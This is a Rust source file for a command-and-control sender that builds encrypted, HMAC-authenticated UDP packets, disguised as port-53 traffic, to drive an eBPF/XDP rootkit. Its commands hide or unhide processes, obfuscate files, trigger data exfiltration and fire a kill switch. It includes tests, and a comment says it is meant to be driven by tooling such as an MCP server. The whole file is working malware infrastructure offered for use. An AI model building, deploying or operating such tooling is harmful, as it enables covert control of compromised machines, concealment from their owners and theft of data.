//! `aegis-c2` — C2 packet sender for the Aegis-Shadow offense rootkit.
//!
//! This crate builds the encrypted C2 command packets that the offense
//! rootkit's XDP program (`offense-ebpf/src/c2.rs`) accepts, so downstream
//! tooling (e.g. the RedHands MCP server) can drive a running rootkit without
//! reimplementing the protocol. The crypto primitives (`chacha8_block`,
//! `compute_hmac`) and the wire types/keys are reused from the `common` crate,
//! which mirrors the eBPF receiver — single source of truth.
//!
//! # Wire format (UDP payload, 48 bytes)
//!
//! ```text
//! offset  size  field
//! 0       4     magic 0xDEADBEEF               (common::MAGIC_BYTES)
//! 4       12    ChaCha20 nonce                 (common::CHACHA20_NONCE_LEN)
//! 16      16    CommandPayload, XOR-encrypted  (common::CommandPayload, 4x u32 LE)
//!               with the ChaCha8 keystream
//! 32      16    keyed HMAC over bytes 0..32    (common::c2_parse::compute_hmac)
//! ```
//!
//! The XDP receiver drops the packet after processing (`XDP_DROP`) and never
//! sends an ACK, so sending is fire-and-forget. The receiver only accepts
//! IPv4/UDP frames destined for port 53 (see `try_shadow_xdp`).
//!
//! # Example
//!
//! ```
//! use aegis_c2::{build_c2_payload, build_command_payload, generate_nonce, CommandKind};
//! use common::{CommandPayload, C2_CHACHA20_KEY};
//!
//! let command = build_command_payload(CommandKind::HidePid, Some("1234")).unwrap();
//! let payload = build_c2_payload(&C2_CHACHA20_KEY, &generate_nonce(), &command);
//! assert_eq!(payload.len(), 48);
//! ```

use common::c2_parse::{chacha8_block, compute_hmac};
use common::{CommandPayload, C2_HMAC_LEN, CHACHA20_NONCE_LEN, MAGIC_BYTES};
use std::net::{Ipv4Addr, UdpSocket};
use std::str::FromStr;
use std::time::{SystemTime, UNIX_EPOCH};

/// Total C2 UDP payload size: magic (4) + nonce (12) + command (16) + HMAC (16).
pub const C2_PAYLOAD_LEN: usize =
    4 + CHACHA20_NONCE_LEN + std::mem::size_of::<CommandPayload>() + C2_HMAC_LEN;

/// A C2 command understood by the rootkit.
///
/// The variants mirror `dispatch_c2_command` in `offense/src/main.rs` and the
/// `match cmd.cmd_type` block in `offense-ebpf/src/c2.rs`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
pub enum CommandKind {
    /// Hide a process by PID (cmd_type 1).
    HidePid,
    /// Unhide a process by PID (cmd_type 2).
    UnhidePid,
    /// Obfuscate a file by inode number (cmd_type 3).
    ObfuscateFile,
    /// Request data exfiltration (cmd_type 4).
    Exfil,
    /// Trigger the rootkit kill switch (cmd_type 5).
    KillSwitch,
}

impl CommandKind {
    /// Numeric command ID used on the wire (`CommandPayload::cmd_type`).
    pub fn cmd_type(self) -> u32 {
        match self {
            CommandKind::HidePid => 1,
            CommandKind::UnhidePid => 2,
            CommandKind::ObfuscateFile => 3,
            CommandKind::Exfil => 4,
            CommandKind::KillSwitch => 5,
        }
    }

    /// Human-readable name (matches the CLI spelling, e.g. `hide-pid`).
    pub fn name(self) -> &'static str {
        match self {
            CommandKind::HidePid => "hide-pid",
            CommandKind::UnhidePid => "unhide-pid",
            CommandKind::ObfuscateFile => "obfuscate-file",
            CommandKind::Exfil => "exfil",
            CommandKind::KillSwitch => "kill-switch",
        }
    }

    /// Whether the command requires a positive integer argument (pid/inode).
    pub fn takes_arg(self) -> bool {
        matches!(
            self,
            CommandKind::HidePid | CommandKind::UnhidePid | CommandKind::ObfuscateFile
        )
    }
}

impl FromStr for CommandKind {
    type Err = CommandError;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "hide-pid" => Ok(CommandKind::HidePid),
            "unhide-pid" => Ok(CommandKind::UnhidePid),
            "obfuscate-file" => Ok(CommandKind::ObfuscateFile),
            "exfil" => Ok(CommandKind::Exfil),
            "kill-switch" => Ok(CommandKind::KillSwitch),
            other => Err(CommandError::UnknownCommand(other.to_string())),
        }
    }
}

/// Errors produced while validating CLI input into a wire-ready command.
#[derive(Debug, PartialEq, thiserror::Error)]
pub enum CommandError {
    /// The command name is not one of the five supported C2 commands.
    #[error("unknown command {0:?}: expected one of hide-pid, unhide-pid, obfuscate-file, exfil, kill-switch")]
    UnknownCommand(String),
    /// A pid/inode argument is required but was not provided.
    #[error("{0} requires a positive integer argument (pid or inode) via --arg")]
    MissingArg(&'static str),
    /// The argument is not a positive integer that fits the 32-bit wire field.
    #[error("invalid {field} {value:?}: must be a positive integer that fits in 32 bits")]
    InvalidArg { field: &'static str, value: String },
    /// An argument was provided for a command that does not take one.
    #[error("{0} does not take an argument")]
    UnexpectedArg(&'static str),
    /// The key override is not a 64-character hex string.
    #[error("invalid key override: expected 64 hex characters (32 bytes), got {0} characters")]
    InvalidKeyLen(usize),
    /// The key override contains non-hex characters.
    #[error("invalid key override: found non-hex character {0:?}")]
    InvalidKeyHex(char),
}

/// Validate CLI input and build the wire-ready [`CommandPayload`].
///
/// - `hide-pid` / `unhide-pid`: `arg` must be a positive PID fitting in `u32`.
/// - `obfuscate-file`: `arg` must be a positive inode fitting in `u32`
///   (the wire field `arg1` is 32-bit; the eBPF side widens it to `u64`).
/// - `exfil` / `kill-switch`: `arg` must be absent or empty.
pub fn build_command_payload(
    kind: CommandKind,
    arg: Option<&str>,
) -> Result<CommandPayload, CommandError> {
    let arg1 = if kind.takes_arg() {
        let field = if kind == CommandKind::ObfuscateFile {
            "inode"
        } else {
            "pid"
        };
        // Treat an empty --arg as absent (the CLI treats empty as "no value").
        let raw = arg
            .filter(|s| !s.is_empty())
            .ok_or(CommandError::MissingArg(kind.name()))?;
        parse_positive_u32(raw, field)?
    } else {
        if let Some(value) = arg {
            if !value.is_empty() {
                return Err(CommandError::UnexpectedArg(kind.name()));
            }
        }
        0
    };

    Ok(CommandPayload {
        cmd_type: kind.cmd_type(),
        arg1,
        arg2: 0,
        _pad: 0,
    })
}

fn parse_positive_u32(raw: &str, field: &'static str) -> Result<u32, CommandError> {
    match raw.parse::<u32>() {
        Ok(value) if value > 0 => Ok(value),
        _ => Err(CommandError::InvalidArg {
            field,
            value: raw.to_string(),
        }),
    }
}

/// Build the encrypted 48-byte C2 UDP payload for `command`.
///
/// Layout (must match the XDP receiver byte-for-byte):
/// `magic || nonce || ChaCha8-encrypted CommandPayload || HMAC(magic..encrypted)`.
/// The HMAC always uses the shared `C2_HMAC_KEY` baked into the receiver;
/// `key` only overrides the ChaCha20 encryption key.
pub fn build_c2_payload(key: &[u8; 32], nonce: &[u8; 12], command: &CommandPayload) -> Vec<u8> {
    debug_assert_eq!(std::mem::size_of::<CommandPayload>(), 16);

    let mut payload = Vec::with_capacity(C2_PAYLOAD_LEN);
    payload.extend_from_slice(&MAGIC_BYTES);
    payload.extend_from_slice(nonce);

    // Serialize the #[repr(C)] u32 fields in little-endian order, matching the
    // receiver's reinterpretation of the decrypted bytes on bpfel/x86_64/aarch64.
    let mut cmd_bytes = [0u8; 16];
    cmd_bytes[0..4].copy_from_slice(&command.cmd_type.to_le_bytes());
    cmd_bytes[4..8].copy_from_slice(&command.arg1.to_le_bytes());
    cmd_bytes[8..12].copy_from_slice(&command.arg2.to_le_bytes());
    cmd_bytes[12..16].copy_from_slice(&command._pad.to_le_bytes());

    let keystream = chacha8_block(key, nonce, 0);
    for (b, k) in cmd_bytes.iter_mut().zip(keystream.iter()) {
        *b ^= k;
    }
    payload.extend_from_slice(&cmd_bytes);

    // HMAC covers magic + nonce + encrypted command (bytes 0..32), exactly the
    // range compute_c2_hmac is fed by the XDP program.
    let mac = compute_hmac(&payload);
    payload.extend_from_slice(&mac);

    debug_assert_eq!(payload.len(), C2_PAYLOAD_LEN);
    payload
}

/// Generate a fresh 12-byte ChaCha20 nonce.
///
/// Prefers the OS entropy pool (`/dev/urandom`); falls back to mixing wall-clock
/// nanoseconds with the PID if the pool is unavailable. The receiver does not
/// track nonces (no replay protection), so uniqueness is best-effort.
pub fn generate_nonce() -> [u8; 12] {
    if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
        let mut nonce = [0u8; 12];
        if std::io::Read::read_exact(&mut f, &mut nonce).is_ok() {
            return nonce;
        }
    }
    let mut state = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
        ^ ((std::process::id() as u64) << 32);
    let mut nonce = [0u8; 12];
    for chunk in nonce.chunks_mut(8) {
        let z = splitmix64(&mut state);
        chunk.copy_from_slice(&z.to_le_bytes()[..chunk.len()]);
    }
    nonce
}

fn splitmix64(state: &mut u64) -> u64 {
    *state = state.wrapping_add(0x9E37_79B9_7F4A_7C15);
    let mut z = *state;
    z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
    z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
    z ^ (z >> 31)
}

/// Parse a 64-character hex string into a 32-byte ChaCha20 key override.
///
/// Note: the stock rootkit has no key rotation — both the ChaCha20 and HMAC
/// keys are compile-time constants in `offense-ebpf`. An override only works
/// against a custom-built receiver that was compiled with the same key.
pub fn parse_key(hex: &str) -> Result<[u8; 32], CommandError> {
    let hex = hex.trim();
    if hex.len() != 64 {
        return Err(CommandError::InvalidKeyLen(hex.len()));
    }
    let bytes = hex.as_bytes();
    let mut key = [0u8; 32];
    for (i, slot) in key.iter_mut().enumerate() {
        *slot = parse_hex_byte(bytes[2 * i], bytes[2 * i + 1])?;
    }
    Ok(key)
}

fn parse_hex_byte(hi: u8, lo: u8) -> Result<u8, CommandError> {
    let hi = hex_digit(hi)?;
    let lo = hex_digit(lo)?;
    Ok((hi << 4) | lo)
}

fn hex_digit(c: u8) -> Result<u8, CommandError> {
    match c {
        b'0'..=b'9' => Ok(c - b'0'),
        b'a'..=b'f' => Ok(c - b'a' + 10),
        b'A'..=b'F' => Ok(c - b'A' + 10),
        _ => Err(CommandError::InvalidKeyHex(c as char)),
    }
}

/// Send a C2 payload to the rootkit over UDP.
///
/// Fire-and-forget: the XDP receiver processes accepted commands and drops the
/// packet (`XDP_DROP`) without ever responding, so there is no ACK to wait for.
/// Success only means the datagram was handed to the kernel for delivery.
pub fn send_payload(target: Ipv4Addr, port: u16, payload: &[u8]) -> std::io::Result<usize> {
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.send_to(payload, (target, port))
}

/// Wrap a C2 UDP payload in the Ethernet/IPv4/UDP framing the XDP program
/// parses. Useful for verifying packets with `common::c2_parse::parse_c2_packet`
/// in user-space tests (on the wire the kernel builds these headers).
pub fn wrap_payload_in_frame(payload: &[u8], dst_port: u16) -> Vec<u8> {
    const ETH_HDR_LEN: usize = 14;
    const IP_HDR_LEN: usize = 20;
    const UDP_HDR_LEN: usize = 8;

    let mut frame = Vec::with_capacity(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + payload.len());

    // Ethernet header: dst MAC, src MAC, ethertype IPv4.
    frame.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x01]);
    frame.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x02]);
    frame.extend_from_slice(&0x0800u16.to_be_bytes());

    // IPv4 header (20 bytes, no options). The receiver only checks the
    // protocol field (offset 9); checksum/addresses are not verified.
    frame.extend_from_slice(&[0x45, 0x00]); // version/IHL, TOS
    frame.extend_from_slice(&((IP_HDR_LEN + UDP_HDR_LEN + payload.len()) as u16).to_be_bytes());
    frame.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]); // id, flags/fragment offset
    frame.push(64); // TTL
    frame.push(17); // protocol: UDP
    frame.extend_from_slice(&[0x00, 0x00]); // checksum (unchecked by receiver)
    frame.extend_from_slice(&[192, 168, 1, 100]); // src IP
    frame.extend_from_slice(&[10, 0, 0, 2]); // dst IP

    // UDP header: src port, dst port, length, checksum (unchecked).
    frame.extend_from_slice(&[0x30, 0x39]); // src port 12345
    frame.extend_from_slice(&dst_port.to_be_bytes());
    frame.extend_from_slice(&((UDP_HDR_LEN + payload.len()) as u16).to_be_bytes());
    frame.extend_from_slice(&[0x00, 0x00]);

    frame.extend_from_slice(payload);
    frame
}

#[cfg(test)]
mod tests {
    use super::*;
    use common::c2_parse::{parse_c2_packet, C2Packet, C2ParseError};
    use common::C2_CHACHA20_KEY;

    const TEST_NONCE: [u8; 12] = [0x42; 12];

    fn round_trip(kind: CommandKind, arg: Option<&str>) -> C2Packet {
        let command = build_command_payload(kind, arg).expect("command should validate");
        let payload = build_c2_payload(&C2_CHACHA20_KEY, &TEST_NONCE, &command);
        assert_eq!(payload.len(), C2_PAYLOAD_LEN);
        assert_eq!(payload[..4], MAGIC_BYTES);
        assert_eq!(payload[4..16], TEST_NONCE);

        let frame = wrap_payload_in_frame(&payload, common::C2_PORT);
        parse_c2_packet(&frame).expect("real parser must accept the crafted packet")
    }

    #[test]
    fn round_trip_hide_pid() {
        let packet = round_trip(CommandKind::HidePid, Some("1234"));
        assert!(packet.encrypted);
        assert_eq!(
            packet.command,
            CommandPayload {
                cmd_type: 1,
                arg1: 1234,
                arg2: 0,
                _pad: 0
            }
        );
    }

    #[test]
    fn round_trip_all_commands() {
        let cases = [
            (CommandKind::HidePid, Some("4242"), 1, 4242),
            (CommandKind::UnhidePid, Some("4242"), 2, 4242),
            (CommandKind::ObfuscateFile, Some("987654"), 3, 987654),
            (CommandKind::Exfil, None, 4, 0),
            (CommandKind::KillSwitch, Some(""), 5, 0),
        ];
        for (kind, arg, cmd_type, arg1) in cases {
            let packet = round_trip(kind, arg);
            assert!(packet.encrypted, "{kind:?} should be encrypted");
            assert_eq!(packet.command.cmd_type, cmd_type);
            assert_eq!(packet.command.arg1, arg1);
            assert_eq!(packet.command.arg2, 0);
        }
    }

    #[test]
    fn round_trip_with_random_nonce() {
        // A fresh nonce per packet must still verify (HMAC covers the nonce).
        let command = build_command_payload(CommandKind::KillSwitch, None).unwrap();
        let payload = build_c2_payload(&C2_CHACHA20_KEY, &generate_nonce(), &command);
        let frame = wrap_payload_in_frame(&payload, 53);
        let packet = parse_c2_packet(&frame).unwrap();
        assert_eq!(packet.command.cmd_type, 5);
    }

    #[test]
    fn tampered_payload_fails_hmac() {
        let command = build_command_payload(CommandKind::HidePid, Some("1234")).unwrap();
        let mut payload = build_c2_payload(&C2_CHACHA20_KEY, &TEST_NONCE, &command);
        payload[20] ^= 0xFF; // flip a bit inside the encrypted command
        let frame = wrap_payload_in_frame(&payload, 53);
        assert_eq!(parse_c2_packet(&frame), Err(C2ParseError::HmacMismatch));
    }

    #[test]
    fn wrong_port_is_rejected_by_parser() {
        let command = build_command_payload(CommandKind::HidePid, Some("1234")).unwrap();
        let payload = build_c2_payload(&C2_CHACHA20_KEY, &TEST_NONCE, &command);
        let frame = wrap_payload_in_frame(&payload, 5353);
        assert_eq!(parse_c2_packet(&frame), Err(C2ParseError::NotPort53));
    }

    #[test]
    fn rejects_missing_arg() {
        assert_eq!(
            build_command_payload(CommandKind::HidePid, None),
            Err(CommandError::MissingArg("hide-pid"))
        );
        assert_eq!(
            build_command_payload(CommandKind::ObfuscateFile, Some("")),
            Err(CommandError::MissingArg("obfuscate-file"))
        );
    }

    #[test]
    fn rejects_bad_arg_values() {
        for bad in ["0", "-1", "abc", "4294967296", "1.5", " "] {
            assert_eq!(
                build_command_payload(CommandKind::HidePid, Some(bad)),
                Err(CommandError::InvalidArg {
                    field: "pid",
                    value: bad.to_string()
                }),
                "pid {bad:?} should be rejected"
            );
        }
        // Inodes above u32::MAX do not fit the 32-bit arg1 wire field.
        assert_eq!(
            build_command_payload(CommandKind::ObfuscateFile, Some("4294967296")),
            Err(CommandError::InvalidArg {
                field: "inode",
                value: "4294967296".to_string()
            })
        );
    }

    #[test]
    fn rejects_arg_for_argless_commands() {
        assert_eq!(
            build_command_payload(CommandKind::KillSwitch, Some("1234")),
            Err(CommandError::UnexpectedArg("kill-switch"))
        );
        assert_eq!(
            build_command_payload(CommandKind::Exfil, Some("junk")),
            Err(CommandError::UnexpectedArg("exfil"))
        );
        // Empty string is tolerated for argless commands.
        assert!(build_command_payload(CommandKind::Exfil, Some("")).is_ok());
    }

    #[test]
    fn rejects_unknown_command_names() {
        assert_eq!(
            "hide_pid".parse::<CommandKind>(),
            Err(CommandError::UnknownCommand("hide_pid".to_string()))
        );
        assert_eq!(
            "bogus".parse::<CommandKind>(),
            Err(CommandError::UnknownCommand("bogus".to_string()))
        );
        assert!("hide-pid".parse::<CommandKind>().is_ok());
    }

    #[test]
    fn key_override_parsing() {
        let hex = "41".repeat(32);
        let key = parse_key(&hex).unwrap();
        assert_eq!(key, [0x41; 32]);

        assert_eq!(parse_key("abcd"), Err(CommandError::InvalidKeyLen(4)));
        assert_eq!(
            parse_key(&"zz".repeat(32)),
            Err(CommandError::InvalidKeyHex('z'))
        );
    }

    #[test]
    fn key_override_changes_ciphertext_but_keeps_hmac_valid() {
        // The HMAC key (C2_HMAC_KEY) is fixed and independent of the ChaCha20
        // key, and the HMAC covers the ciphertext. A custom-key packet is
        // therefore still well-formed (HMAC verifies), but a stock receiver
        // decrypts it to a different — garbage — command.
        let command = build_command_payload(CommandKind::HidePid, Some("1234")).unwrap();
        let stock = build_c2_payload(&C2_CHACHA20_KEY, &TEST_NONCE, &command);
        let custom = build_c2_payload(&[0x41; 32], &TEST_NONCE, &command);
        assert_eq!(stock.len(), custom.len());
        assert_ne!(stock[16..32], custom[16..32], "ciphertext must differ");

        let custom_frame = wrap_payload_in_frame(&custom, 53);
        let packet =
            parse_c2_packet(&custom_frame).expect("HMAC must still verify for a custom-key packet");
        assert_ne!(packet.command, command, "stock key must not decrypt it");
    }

    #[test]
    fn nonce_generation_varies() {
        // generate_nonce must at minimum produce different nonces across calls.
        let a = generate_nonce();
        let b = generate_nonce();
        assert_ne!(a, b);
    }
}
